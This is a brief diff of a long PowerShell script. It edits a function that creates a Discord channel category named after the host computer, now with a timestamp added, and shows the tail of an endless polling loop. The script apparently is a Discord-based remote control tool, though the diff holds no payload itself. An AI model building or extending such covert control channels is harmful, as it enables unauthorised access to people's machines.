@@ -81,7 +81,7 @@ Function NewChannelCategory{
     $uri = "https://discord.com/api/guilds/$guildID/channels"
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $body = @{
-        "name" = "$env:COMPUTERNAME"
+        "name" = "$env:COMPUTERNAME $timestamp"
         "type" = 4
     } | ConvertTo-Json    
     $wc = New-Object System.Net.WebClient
@@ -2021,3 +2021,4 @@ while ($true) {
     }
     Sleep 3
 }
+
